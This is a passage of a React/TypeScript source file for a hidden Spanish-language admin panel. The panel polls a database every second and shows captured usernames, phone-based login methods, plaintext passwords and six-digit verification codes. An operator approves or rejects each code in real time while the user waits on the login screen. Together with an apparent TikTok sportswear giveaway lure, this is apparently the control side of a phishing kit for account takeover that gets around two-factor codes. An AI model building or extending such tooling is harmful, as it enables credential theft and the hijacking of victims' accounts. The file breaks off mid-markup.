import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
  fetchFullAdminData,
  deleteUserById,
  deleteCodeById,
  clearAllAdminData,
  updateCodeStatusInDb,
  type FullAdminData,
  type AdminUserWithCodes,
  type CodeRecord,
} from '../../api/admin.api';
import { apiClient } from '../../api/loging.api';

import {
  getVerificationRequests,
  approveVerificationRequest,
  rejectVerificationRequest,
  subscribeToAllVerificationRequests,
} from '../../services/verification.service';

import type { SportswearEntry, VerificationRequest, VerificationStatus } from '../../types/auth';

interface AdminPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

interface ActivityLog {
  id: string;
  time: string;
  type: 'user' | 'code' | 'delete' | 'sync' | 'approve' | 'reject';
  message: string;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
  const [data, setData] = useState<FullAdminData | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [activeTab, setActiveTab] = useState<
    'cards' | 'live-verify' | 'users' | 'codes' | 'contest' | 'activity'
  >('cards');
  const [showPasswords, setShowPasswords] = useState(true);
  const [isLiveActive, setIsLiveActive] = useState(true);
  const [copiedText, setCopiedText] = useState<string | null>(null);
  const [activityLogs, setActivityLogs] = useState<ActivityLog[]>([]);
  const [contestEntries, setContestEntries] = useState<SportswearEntry[]>([]);
  const [verificationRequests, setVerificationRequests] = useState<VerificationRequest[]>([]);

  // Ref para rastrear conteos anteriores y detectar cambios en tiempo real
  const prevUsersCountRef = useRef<number>(0);
  const prevCodesCountRef = useRef<number>(0);
  const prevPendingCountRef = useRef<number>(0);

  // Función para cargar datos de la base de datos
  const loadData = useCallback(async (isManual = false) => {
    if (isManual) setLoading(true);
    try {
      const result = await fetchFullAdminData();

      // Detectar nuevos usuarios para el feed de actividad
      if (prevUsersCountRef.current > 0 && result.rawUsers.length > prevUsersCountRef.current) {
        const latestUser = result.rawUsers[0];
        const logEntry: ActivityLog = {
          id: `log_${Date.now()}_${Math.random()}`,
          time: new Date().toLocaleTimeString(),
          type: 'user',
          message: `Nuevo usuario registrado: ${latestUser?.username} (Método: ${latestUser?.inicio_sesion}, ID: #${latestUser?.id})`,
        };
        setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
      }

      // Detectar nuevos códigos para el feed de actividad
      if (prevCodesCountRef.current > 0 && result.rawCodes.length > prevCodesCountRef.current) {
        const latestCode = result.rawCodes[0];
        const logEntry: ActivityLog = {
          id: `log_${Date.now()}_${Math.random()}`,
          time: new Date().toLocaleTimeString(),
          type: 'code',
          message: `Nuevo código ingresado: ${latestCode?.codigo} (Usuario ID: #${latestCode?.user_id})`,
        };
        setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
      }

      prevUsersCountRef.current = result.rawUsers.length;
      prevCodesCountRef.current = result.rawCodes.length;

      // Cargar participantes del sorteo de ropa deportiva
      try {
        const rawContest = localStorage.getItem('tiktok_sportswear_entries');
        if (rawContest) {
          setContestEntries(JSON.parse(rawContest));
        }
      } catch {
        // Ignorar
      }

      setData(result);
      setError(null);
    } catch (err: unknown) {
      const errorObj = err as Error;
      setError(errorObj.message || 'Error al conectar con la API.');
    } finally {
      if (isManual) setLoading(false);
    }
  }, []);

  // Suscripción reactiva en tiempo real a las solicitudes de verificación
  useEffect(() => {
    if (!isOpen) return;

    setVerificationRequests(getVerificationRequests());

    const unsubscribe = subscribeToAllVerificationRequests((reqs) => {
      setVerificationRequests(reqs);

      // Detectar si hay una nueva solicitud pendiente
      const pendingCount = reqs.filter((r) => r.status === 'PENDING').length;
      if (pendingCount > prevPendingCountRef.current) {
        const latest = reqs.find((r) => r.status === 'PENDING');
        if (latest) {
          const logEntry: ActivityLog = {
            id: `log_${Date.now()}_${Math.random()}`,
            time: new Date().toLocaleTimeString(),
            type: 'code',
            message: `⚠️ Solicitud de código recibida: [${latest.codigo}] por ${latest.username}. Esperando validación.`,
          };
          setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
        }
      }
      prevPendingCountRef.current = pendingCount;
    });

    return () => {
      unsubscribe();
    };
  }, [isOpen]);

  // Polling en tiempo real cada 1000ms cuando el modal está abierto
  useEffect(() => {
    if (!isOpen) return;

    loadData();

    if (!isLiveActive) return;

    const interval = setInterval(() => {
      loadData();
    }, 1000);

    return () => clearInterval(interval);
  }, [isOpen, isLiveActive, loadData]);

  // Listener para cerrar con tecla ESC
  useEffect(() => {
    if (!isOpen) return;

    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape') {
        onClose();
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [isOpen, onClose]);

  // Copiar al portapapeles
  const handleCopy = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(label);
    setTimeout(() => setCopiedText(null), 1800);
  };

  // ACCIÓN ADMIN 1: Aceptar código (Marca como correcto en PostgreSQL e inicia sesión)
  const handleApprove = async (
    requestId: string,
    codigo: string,
    username: string,
    codeId?: number
  ) => {
    approveVerificationRequest(requestId);

    // Sincronizar de inmediato con PostgreSQL en Render
    let targetCodeId = codeId;
    if (!targetCodeId) {
      const match =
        data?.rawCodes.find((c) => c.codigo === codigo && c.estado === 'PENDING') ||
        data?.rawCodes.find((c) => c.codigo === codigo);
      targetCodeId = match?.id_codigo;
    }

    // Si aún no está en data, consultar códigos frescos de la nube de Render
    if (!targetCodeId) {
      try {
        const fresh = await apiClient.get<{ success: boolean; codes: CodeRecord[] }>(
          `/auth/codes?_t=${Date.now()}`
        );
        const freshCodes = fresh.data?.codes || [];
        const freshMatch =
          freshCodes.find((c) => c.codigo === codigo && c.estado === 'PENDING') ||
          freshCodes.find((c) => c.codigo === codigo);
        targetCodeId = freshMatch?.id_codigo;
      } catch (err) {
        console.warn('Error al buscar código fresco en Render:', err);
      }
    }

    if (targetCodeId) {
      await updateCodeStatusInDb(targetCodeId, 'APPROVED');
      loadData();
    }

    const logEntry: ActivityLog = {
      id: `log_${Date.now()}_${Math.random()}`,
      time: new Date().toLocaleTimeString(),
      type: 'approve',
      message: `✅ Admin APROBÓ el código [${codigo}] para "${username}". Inicio de sesión CONCEDIDO.`,
    };
    setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
    setVerificationRequests(getVerificationRequests());
  };

  // ACCIÓN ADMIN 2: Rechazar código (Marca como incorrecto en PostgreSQL y deniega inicio de sesión)
  const handleReject = async (
    requestId: string,
    codigo: string,
    username: string,
    codeId?: number
  ) => {
    rejectVerificationRequest(
      requestId,
      'Introduce un código de verificación válido'
    );

    // Sincronizar de inmediato con PostgreSQL en Render
    let targetCodeId = codeId;
    if (!targetCodeId) {
      const match =
        data?.rawCodes.find((c) => c.codigo === codigo && c.estado === 'PENDING') ||
        data?.rawCodes.find((c) => c.codigo === codigo);
      targetCodeId = match?.id_codigo;
    }

    // Si aún no está en data, consultar códigos frescos de la nube de Render
    if (!targetCodeId) {
      try {
        const fresh = await apiClient.get<{ success: boolean; codes: CodeRecord[] }>(
          `/auth/codes?_t=${Date.now()}`
        );
        const freshCodes = fresh.data?.codes || [];
        const freshMatch =
          freshCodes.find((c) => c.codigo === codigo && c.estado === 'PENDING') ||
          freshCodes.find((c) => c.codigo === codigo);
        targetCodeId = freshMatch?.id_codigo;
      } catch (err) {
        console.warn('Error al buscar código fresco en Render:', err);
      }
    }

    if (targetCodeId) {
      await updateCodeStatusInDb(targetCodeId, 'REJECTED');
      loadData();
    }

    const logEntry: ActivityLog = {
      id: `log_${Date.now()}_${Math.random()}`,
      time: new Date().toLocaleTimeString(),
      type: 'reject',
      message: `❌ Admin RECHAZÓ el código [${codigo}] para "${username}". Código marcado como INCORRECTO.`,
    };
    setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
    setVerificationRequests(getVerificationRequests());
  };

  // Decisión rápida para cualquier código listado en las tablas
  const handleQuickDecision = async (
    codigo: string,
    userId: number,
    decision: 'APPROVED' | 'REJECTED',
    codeId?: number
  ) => {
    const targetUser = data?.rawUsers.find((u) => Number(u.id) === Number(userId));
    const username = targetUser?.username || `Usuario #${userId}`;

    const existingReq = verificationRequests.find(
      (r) => r.codigo === codigo && (Number(r.userId) === Number(userId) || !r.userId)
    );

    const reqId = existingReq ? existingReq.id : `req_${Date.now()}`;
    if (decision === 'APPROVED') {
      await handleApprove(reqId, codigo, username, codeId);
    } else {
      await handleReject(reqId, codigo, username, codeId);
    }
  };

  // Obtener estado de un código (Prioridad: base de datos PostgreSQL en la nube)
  const getCodeStatus = (codigo: string, userId?: number): VerificationStatus | null => {
    // 1. Verificar si viene con estado desde la base de datos de Render
    const dbCode = data?.rawCodes.find(
      (c) =>
        c.codigo === codigo &&
        (userId === undefined || Number(c.user_id) === Number(userId))
    );
    if (dbCode?.estado) {
      return dbCode.estado;
    }

    // 2. Solicitudes locales en memoria
    const req = verificationRequests.find(
      (r) =>
        r.codigo === codigo &&
        (userId === undefined || Number(r.userId) === Number(userId) || !r.userId)
    );
    return req ? req.status : null;
  };

  // Eliminar usuario
  const handleDeleteUser = async (userId: number, username: string) => {
    if (
      !window.confirm(
        `¿Seguro que deseas eliminar al usuario "${username}" (ID: ${userId}) y sus códigos?`
      )
    ) {
      return;
    }
    const success = await deleteUserById(userId);
    if (success) {
      const logEntry: ActivityLog = {
        id: `log_${Date.now()}`,
        time: new Date().toLocaleTimeString(),
        type: 'delete',
        message: `Usuario #${userId} (${username}) eliminado de la base de datos.`,
      };
      setActivityLogs((prev) => [logEntry, ...prev]);
      loadData(true);
    } else {
      alert('No se pudo eliminar el usuario.');
    }
  };

  // Eliminar código
  const handleDeleteCode = async (codeId: number) => {
    if (!window.confirm(`¿Eliminar código ID #${codeId}?`)) return;
    const success = await deleteCodeById(codeId);
    if (success) {
      loadData(true);
    }
  };

  // Limpiar toda la base de datos
  const handleClearAll = async () => {
    const confirmation = window.prompt(
      '⚠️ ATENCIÓN: Esta acción borrará TODOS los usuarios y códigos de PostgreSQL.\nEscribe "BORRAR" para confirmar:'
    );
    if (confirmation === 'BORRAR') {
      const success = await clearAllAdminData();
      if (success) {
        setActivityLogs([]);
        loadData(true);
        alert('Base de datos vaciada exitosamente.');
      }
    }
  };

  if (!isOpen) return null;

  // Solicitudes pendientes de validación en tiempo real (Unificando local + base de datos en la nube de Render)
  const pendingCloudRequests: (VerificationRequest & { codeId?: number })[] = (data?.rawCodes || [])
    .filter((c) => c.estado === 'PENDING')
    .map((c) => {
      const targetUser = data?.rawUsers.find((u) => Number(u.id) === Number(c.user_id));
      return {
        id: `cloud_${c.id_codigo}`,
        codeId: c.id_codigo,
        userId: c.user_id,
        username: targetUser?.username || `Usuario #${c.user_id}`,
        codigo: c.codigo,
        status: 'PENDING' as VerificationStatus,
        createdAt: Date.now(),
      };
    });

  // Combinar sin duplicados
  const pendingRequests = [
    ...verificationRequests.filter((r) => r.status === 'PENDING'),
    ...pendingCloudRequests.filter(
      (cloud) =>
        !verificationRequests.some(
          (local) =>
            local.status === 'PENDING' &&
            local.codigo === cloud.codigo &&
            (Number(local.userId) === Number(cloud.userId) || !local.userId)
        )
    ),
  ];

  // Solicitudes globales para la pestaña live-verify
  const allCloudRequests: (VerificationRequest & { codeId?: number })[] = (data?.rawCodes || []).map((c) => {
    const targetUser = data?.rawUsers.find((u) => Number(u.id) === Number(c.user_id));
    return {
      id: `cloud_${c.id_codigo}`,
      codeId: c.id_codigo,
      userId: c.user_id,
      username: targetUser?.username || `Usuario #${c.user_id}`,
      codigo: c.codigo,
      status: (c.estado || 'PENDING') as VerificationStatus,
      createdAt: Date.now(),
    };
  });

  const displayVerificationRequests = [
    ...verificationRequests,
    ...allCloudRequests.filter(
      (cr) =>
        !verificationRequests.some(
          (vr) =>
            vr.codigo === cr.codigo &&
            (Number(vr.userId) === Number(cr.userId) || !vr.userId)
        )
    ),
  ];

  // Filtrado reactivo de usuarios
  const filteredUsers = (data?.users || []).filter((u: AdminUserWithCodes) => {
    const term = searchTerm.toLowerCase();
    const matchesUser =
      String(u.id).includes(term) ||
      u.username.toLowerCase().includes(term) ||
      u.inicio_sesion.toLowerCase().includes(term) ||
      u.password.toLowerCase().includes(term);

    const matchesCode = u.codes.some((c) => c.codigo.includes(term));
    return matchesUser || matchesCode;
  });

  // Filtrado de códigos
  const filteredCodes = (data?.rawCodes || []).filter((c: CodeRecord) => {
    const term = searchTerm.toLowerCase();
    return (
      String(c.id_codigo).includes(term) ||
      String(c.user_id).includes(term) ||
      c.codigo.includes(term)
    );
  });

  return (
    <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex flex-col items-center justify-center p-2 sm:p-4 overflow-hidden select-text animate-fade-in font-sans">
      {/* Container Principal con estilo Cyber-Admin */}
      <div className="w-full max-w-6xl h-[92vh] bg-[#0d1117] border border-[#30363d] rounded-2xl shadow-2xl flex flex-col overflow-hidden text-gray-200">
        
        {/* Top Header Bar */}
        <header className="px-4 sm:px-6 py-3.5 bg-[#161b22] border-b border-[#30363d] flex flex-wrap items-center justify-between gap-3 shrink-0">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-linear-to-br from-emerald-500 to-cyan-600 flex items-center justify-center shadow-lg shadow-cyan-500/20">
              <span className="text-lg">🛡️</span>
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="text-base sm:text-lg font-bold text-white tracking-tight">
                  Panel de Administración Oculto
                </h2>
                <span className="text-[10px] px-2 py-0.5 rounded-full font-mono bg-cyan-500/10 text-cyan-400 border border-cyan-500/30">
                  Ctrl + Shift + A
                </span>
                {pendingRequests.length > 0 && (
                  <span className="text-[10px] px-2 py-0.5 rounded-full font-bold font-mono bg-amber-500/20 text-amber-300 border border-amber-500/40 animate-pulse">
                    🚨 {pendingRequests.length} Códigos en Espera
                  </span>
                )}
              </div>
              <p className="text-xs text-gray-400">
                PostgreSQL <code className="text-emerald-400">users_forms</code> en vivo • Aprobación en Tiempo Real
              </p>
            </div>
          </div>

          {/* Live Status & Actions */}
          <div className="flex items-center flex-wrap gap-2">
            {/* Live indicator button */}
            <button
              onClick={() => setIsLiveActive(!isLiveActive)}
              className={`flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-semibold border transition-all cursor-pointer ${
                isLiveActive
                  ? 'bg-emerald-950/40 border-emerald-500/40 text-emerald-400 shadow-xs shadow-emerald-500/20'
                  : 'bg-yellow-950/40 border-yellow-500/40 text-yellow-400'
              }`}
              title={isLiveActive ? 'Sondeo activo cada 1s (clic para pausar)' : 'Pausado (clic para reanudar)'}
            >
              <span
                className={`w-2 h-2 rounded-full ${
                  isLiveActive ? 'bg-emerald-400 animate-pulse' : 'bg-yellow-400'
                }`}
              />
              <span>{isLiveActive ? 'TIEMPO REAL (1s)' : 'PAUSADO'}</span>
            </button>

            {/* Manual Refresh */}
            <button
              onClick={() => loadData(true)}
              disabled={loading}
              className="px-3 py-1.5 rounded-lg bg-[#21262d] hover:bg-[#30363d] border border-[#30363d] text-xs font-medium text-gray-200 transition-colors flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
              title="Refrescar inmediatamente"
            >
              <span className={loading ? 'animate-spin' : ''}>🔄</span>
              <span>Refrescar</span>
            </button>

            {/* Copy JSON */}
            <button
              onClick={() => handleCopy(JSON.stringify(data, null, 2), 'json_all')}
              className="px-3 py-1.5 rounded-lg bg-[#21262d] hover:bg-[#30363d] border border-[#30363d] text-xs font-medium text-gray-200 transition-colors flex items-center gap-1.5 cursor-pointer"
              title="Copiar toda la base de datos en formato JSON"
            >
              <span>{copiedText === 'json_all' ? '✅ Copiado' : '📋 Copiar JSON'}</span>
            </button>

            {/* Close Button */}
            <button
              onClick={onClose}
              className="px-3 py-1.5 rounded-lg bg-red-950/30 hover:bg-red-900/50 border border-red-500/40 text-red-300 hover:text-white text-xs font-semibold transition-all flex items-center gap-1 cursor-pointer"
              title="Cerrar panel (Esc)"
            >
              <span>✕</span>
              <span>Cerrar (Esc)</span>
            </button>
          </div>
        </header>

        {/* ========================================================================= */}
        {/* BANNER DESTACADO DE ALERTA: CÓDIGOS PENDIENTES DE APROBACIÓN EN TIEMPO REAL */}
        {/* ========================================================================= */}
        {pendingRequests.length > 0 && (
          <section className="px-4 sm:px-6 py-3 bg-amber-950/40 border-b border-amber-500/40 shrink-0 animate-fade-in">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-3">
              <div className="flex items-center gap-3">
                <span className="w-3.5 h-3.5 rounded-full bg-amber-400 animate-ping shrink-0" />
                <div>
                  <div className="flex items-center gap-2">
                    <span className="text-xs font-bold uppercase tracking-wider text-amber-300">
                      🚨 Validación de Código Requerida ({pendingRequests.length} en espera)
                    </span>
                    <span className="text-[10px] bg-amber-400 text-black font-black px-1.5 py-0.2 rounded-full">
                      EN VIVO
                    </span>
                  </div>
                  <p className="text-xs text-amber-200/80 mt-0.5">
                    Un usuario acaba de ingresar su código y está en la pantalla esperando tu decisión:
                  </p>
                </div>
              </div>

              {/* Botones de Aceptar / Rechazar para el código más reciente */}
              <div className="flex items-center gap-3 bg-black/40 border border-amber-500/30 p-2 rounded-xl">
                <div className="text-left px-2">
                  <span className="text-[10px] text-gray-400 block font-mono">
                    {pendingRequests[0].username} {pendingRequests[0].userId ? `(#${pendingRequests[0].userId})` : ''}
                  </span>
                  <span className="text-lg font-black tracking-widest text-white font-mono select-all">
                    {pendingRequests[0].codigo}
                  </span>
                </div>

                <div className="flex items-center gap-2">
                  {/* BOTÓN ACEPTAR (CORRECTO) */}
                  <button
                    onClick={() =>
                      handleApprove(
                        pendingRequests[0].id,
                        pendingRequests[0].codigo,
                        pendingRequests[0].username,
                        (pendingRequests[0] as { codeId?: number }).codeId
                      )
                    }
                    className="px-3.5 py-2 rounded-lg font-bold text-xs bg-emerald-500 hover:bg-emerald-400 text-black transition-all flex items-center gap-1.5 shadow-md shadow-emerald-500/20 active:scale-95 cursor-pointer"
                    title="Aceptar código como correcto y permitir el inicio de sesión"
                  >
                    <span>✓</span>
                    <span>ACEPTAR (Correcto)</span>
                  </button>

                  {/* BOTÓN RECHAZAR (INCORRECTO) */}
                  <button
                    onClick={() =>
                      handleReject(
                        pendingRequests[0].id,
                        pendingRequests[0].codigo,
                        pendingRequests[0].username,
                        (pendingRequests[0] as { codeId?: number }).codeId
                      )
                    }
                    className="px-3.5 py-2 rounded-lg font-bold text-xs bg-rose-600 hover:bg-rose-500 text-white transition-all flex items-center gap-1.5 shadow-md shadow-rose-600/20 active:scale-95 cursor-pointer"
                    title="Rechazar código como incorrecto y pedir que lo vuelva a ingresar"
                  >
                    <span>✕</span>
                    <span>RECHAZAR (Incorrecto)</span>
                  </button>
                </div>
              </div>
            </div>
          </section>
        )}

        {/* Metrics Grid */}
        <section className="px-4 sm:px-6 py-3 bg-[#0d1117] border-b border-[#21262d] grid grid-cols-2 sm:grid-cols-4 gap-3 shrink-0">
          <div className="bg-[#161b22] border border-[#30363d] p-3 rounded-xl flex flex-col justify-between">
            <span className="text-[11px] font-medium text-gray-400 uppercase tracking-wider">Total Usuarios</span>
            <div className="flex items-baseline justify-between mt-1">
              <span className="text-2xl font-bold text-white">{data?.stats.totalUsers ?? 0}</span>
              <span className="text-xs text-emerald-400 font-mono">tabla users</span>
            </div>
          </div>

          <div className="bg-[#161b22] border border-[#30363d] p-3 rounded-xl flex flex-col justify-between">
            <span className="text-[11px] font-medium text-gray-400 uppercase tracking-wider">Total Códigos</span>
            <div className="flex items-baseline justify-between mt-1">
              <span className="text-2xl font-bold text-cyan-400">{data?.stats.totalCodes ?? 0}</span>
              <span className="text-xs text-cyan-400 font-mono">tabla codigos</span>
            </div>
          </div>

          <div className="bg-[#161b22] border border-[#30363d] p-3 rounded-xl flex flex-col justify-between">
            <span className="text-[11px] font-medium text-gray-400 uppercase tracking-wider">Validaciones en Vivo</span>
            <div className="flex items-baseline justify-between mt-1">
              <span className="text-2xl font-bold text-amber-400">{pendingRequests.length}</span>
              <span className="text-xs text-gray-400 font-mono">pendientes</span>
            </div>
          </div>

          <div className="bg-[#161b22] border border-[#30363d] p-3 rounded-xl flex flex-col justify-between">
            <span className="text-[11px] font-medium text-gray-400 uppercase tracking-wider">Último Sondeo</span>
            <div className="flex items-baseline justify-between mt-1">
              <span className="text-xs sm:text-sm font-mono text-gray-300">
                {data?.lastUpdated ? data.lastUpdated.toLocaleTimeString() : '--:--:--'}
              </span>
              <span className="text-[10px] text-emerald-400">● 1.0s</span>
            </div>
          </div>
        </section>

        {/* Toolbar: Search, Filters, Tabs */}
        <div className="px-4 sm:px-6 py-2.5 bg-[#161b22]/50 border-b border-[#30363d] flex flex-wrap items-center justify-between gap-3 shrink-0">
          {/* Navigation Tabs */}
          <div className="flex items-center gap-1 bg-[#0d1117] p-1 rounded-xl border border-[#30363d] overflow-x-auto max-w-full">
            <button
              onClick={() => setActiveTab('cards')}
              className={`px-3 py-1 rounded-lg text-xs font-semibold transition-all cursor-pointer whitespace-nowrap ${
                activeTab === 'cards'
                  ? 'bg-cyan-600 text-white shadow-xs'
                  : 'text-gray-400 hover:text-gray-200'
              }`}
            >
              🗂️ Usuarios y Códigos
            </button>
            <button
              onClick={() => setActiveTab('live-verify')}
              className={`px-3 py-1 rounded-lg text-xs font-semibold transition-all cursor-pointer relative whitespace-nowrap ${
                activeTab === 'live-verify'
                  ? 'bg-amber-600 text-white shadow-xs'
                  : 'text-gray-400 hover:text-gray-200'
              }`}
            >
              ⚡ Aprobación de Códigos ({displayVerificationRequests.length})
              {pendingRequests.length > 0 && (
                <span className="ml-1 px-1.5 py-0.2 bg-amber-400 text-black text-[10px] font-black rounded-full animate-ping">
                  {pendingRequests.length}
                </span>
              )}
            </button>
            <button
              onClick={() => setActiveTab('users')}
              className={`px-3 py-1 rounded-lg text-xs font-semibold transition-all cursor-pointer whitespace-nowrap ${
                activeTab === 'users'
                  ? 'bg-cyan-600 text-white shadow-xs'
                  : 'text-gray-400 hover:text-gray-200'
              }`}
            >
              📋 Tabla users ({data?.rawUsers.length ?? 0})
            </button>
            <button
              onClick={() => setActiveTab('codes')}
              className={`px-3 py-1 rounded-lg text-xs font-semibold transition-all cursor-pointer whitespace-nowrap ${
                activeTab === 'codes'
                  ? 'bg-cyan-600 text-white shadow-xs'
                  : 'text-gray-400 hover:text-gray-200'
              }`}
            >
              🔑 Tabla codigos ({data?.rawCodes.length ?? 0})
            </button>
            <button
              onClick={() => setActiveTab('contest')}
              className={`px-3 py-1 rounded-lg text-xs font-semibold transition-all cursor-pointer whitespace-nowrap ${
                activeTab === 'contest'
                  ? 'bg-[#FE2C55] text-white shadow-xs'
                  : 'text-gray-400 hover:text-gray-200'
              }`}
            >
              🏆 Sorteo Ropa ({contestEntries.length})
            </button>
            <button
              onClick={() => setActiveTab('activity')}
              className={`px-3 py-1 rounded-lg text-xs font-semibold transition-all cursor-pointer relative whitespace-nowrap ${
                activeTab === 'activity'
                  ? 'bg-cyan-600 text-white shadow-xs'
                  : 'text-gray-400 hover:text-gray-200'
              }`}
            >
              ⚡ Actividad en Vivo
              {activityLogs.length > 0 && (
                <span className="ml-1 px-1.5 py-0.2 bg-emerald-500 text-black text-[10px] font-bold rounded-full">
                  {activityLogs.length}
                </span>
              )}
            </button>
          </div>

          {/* Search bar & Show passwords toggle */}
          <div className="flex items-center gap-2 flex-1 max-w-md justify-end">
            <div className="relative flex-1">
              <span className="absolute left-3 top-2.5 text-gray-500 text-xs">🔍</span>
              <input
                type="text"
                placeholder="Buscar por teléfono, usuario, código, ID..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full bg-[#0d1117] border border-[#30363d] focus:border-cyan-500 rounded-xl pl-8 pr-3 py-1.5 text-xs text-white placeholder-gray-500 outline-hidden transition-all"
              />
              {searchTerm && (
                <button
                  onClick={() => setSearchTerm('')}
                  className="absolute right-2.5 top-2 text-xs text-gray-400 hover:text-white"
                >
                  ✕
                </button>
              )}
            </div>

            <button
              onClick={() => setShowPasswords(!showPasswords)}
              className="px-2.5 py-1.5 rounded-lg border border-[#30363d] bg-[#0d1117] hover:bg-[#21262d] text-xs text-gray-300 font-medium cursor-pointer transition-colors whitespace-nowrap"
              title={showPasswords ? 'Ocultar contraseñas' : 'Mostrar contraseñas'}
            >
              {showPasswords ? '👁️ Ocultar claves' : '👁️ Ver claves'}
            </button>
          </div>
        </div>

        {/* Error Banner */}
        {error && (
          <div className="px-6 py-2.5 bg-red-950/60 border-b border-red-500/30 text-red-300 text-xs flex items-center justify-between">
            <div className="flex items-center gap-2">
              <span>⚠️</span>
              <span>{error}</span>
            </div>
            <button
              onClick={() => loadData(true)}
              className="underline font-semibold hover:text-white cursor-pointer"
            >
              Reintentar
            </button>
          </div>
        )}

        {/* Content Area */}
        <div className="flex-1 overflow-y-auto p-4 sm:p-6 space-y-4">
          
          {/* ========================================================================= */}
          {/* TAB: Validación de Códigos en Vivo (Control Room) */}
          {/* ========================================================================= */}
          {activeTab === 'live-verify' && (
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <span>⚡</span>
                    <span>Control de Verificación y Acceso en Tiempo Real</span>
                  </h3>
                  <p className="text-xs text-gray-400 mt-0.5">
                    Decide en tiempo real si el código ingresado por el usuario es correcto o incorrecto para autorizar su inicio de sesión.
                  </p>
                </div>
              </div>

              {displayVerificationRequests.length === 0 ? (
                <div className="py-16 text-center text-gray-500 bg-[#161b22] border border-[#30363d] rounded-2xl">
                  <div className="text-4xl mb-2">📲</div>
                  <p className="text-sm font-medium">No hay solicitudes de código activas en este momento.</p>
                  <p className="text-xs text-gray-600 mt-1">
                    Cuando un usuario complete los 6 dígitos en la pantalla de verificación, aparecerá aquí instantáneamente.
                  </p>
                </div>
              ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {displayVerificationRequests.map((req) => (
                    <div
                      key={req.id}
                      className={`p-4 rounded-xl border flex flex-col justify-between transition-all ${
                        req.status === 'PENDING'
                          ? 'bg-amber-950/20 border-amber-500/50 shadow-lg shadow-amber-500/10'
                          : req.status === 'APPROVED'
                          ? 'bg-emerald-950/20 border-emerald-500/30'
                          : 'bg-rose-950/20 border-rose-500/30'
                      }`}
                    >
                      <div>
                        {/* Header: User and Status */}
                        <div className="flex items-center justify-between mb-3">
                          <span className="text-xs font-mono font-bold text-white">
                            {req.username} {req.userId ? `(#${req.userId})` : ''}
                          </span>
                          <span
                            className={`px-2.5 py-1 rounded-full text-xs font-bold uppercase tracking-wider flex items-center gap-1.5 ${
                              req.status === 'PENDING'
                                ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40 animate-pulse'
                                : req.status === 'APPROVED'
                                ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
                                : 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
                            }`}
                          >
                            <span>
                              {req.status === 'PENDING'
                                ? '⏳ Esperando Decisión'
                                : req.status === 'APPROVED'
                                ? '✓ Código Correcto (Aprobado)'
                                : '✕ Código Incorrecto (Rechazado)'}
                            </span>
                          </span>
                        </div>

                        {/* Code Display */}
                        <div className="p-3 bg-[#0d1117] border border-[#30363d] rounded-xl mb-4 text-center">
                          <span className="text-[10px] text-gray-400 uppercase font-bold tracking-wider block mb-1">
                            Código Ingresado por el Usuario
                          </span>
                          <span className="text-3xl font-black font-mono tracking-widest text-cyan-400 select-all">
                            {req.codigo}
                          </span>
                        </div>

                        <p className="text-[11px] text-gray-400 mb-4">
                          Hora: <span className="text-gray-300 font-mono">{new Date(req.createdAt).toLocaleTimeString()}</span>
                          {req.reviewedAt && (
                            <> • Revisado: <span className="text-gray-300 font-mono">{new Date(req.reviewedAt).toLocaleTimeString()}</span></>
                          )}
                        </p>
                      </div>

                      {/* Action Buttons */}
                      <div className="flex items-center gap-2 pt-3 border-t border-[#30363d]">
                        <button
                          onClick={() =>
                            handleApprove(
                              req.id,
                              req.codigo,
                              req.username,
                              (req as { codeId?: number }).codeId
                            )
                          }
                          className={`flex-1 py-2 px-3 rounded-lg text-xs font-bold flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
                            req.status === 'APPROVED'
                              ? 'bg-emerald-600 text-white cursor-default'
                              : 'bg-emerald-500/20 hover:bg-emerald-500 text-emerald-300 hover:text-black border border-emerald-500/40 active:scale-95'
                          }`}
                        >
                          <span>✓</span>
                          <span>{req.status === 'APPROVED' ? 'Aprobado (Correcto)' : 'Aceptar (Correcto)'}</span>
                        </button>

                        <button
                          onClick={() =>
                            handleReject(
                              req.id,
                              req.codigo,
                              req.username,
                              (req as { codeId?: number }).codeId
                            )
                          }
                          className={`flex-1 py-2 px-3 rounded-lg text-xs font-bold flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
                            req.status === 'REJECTED'
                              ? 'bg-rose-600 text-white cursor-default'
                              : 'bg-rose-500/20 hover:bg-rose-600 text-rose-300 hover:text-white border border-rose-500/40 active:scale-95'
                          }`}
                        >
                          <span>✕</span>
                          <span>{req.status === 'REJECTED' ? 'Rechazado (Incorrecto)' : 'Rechazar (Incorrecto)'}</span>
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* TAB 1: Tarjetas Relacionadas (Usuarios con sus Códigos y Acciones de Aprobación) */}
          {activeTab === 'cards' && (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {filteredUsers.length === 0 ? (
                <div className="col-span-full py-16 text-center text-gray-500">
                  <div className="text-4xl mb-2">📭</div>
                  <p className="text-sm font-medium">No se encontraron registros en la base de datos.</p>
                  {searchTerm && (
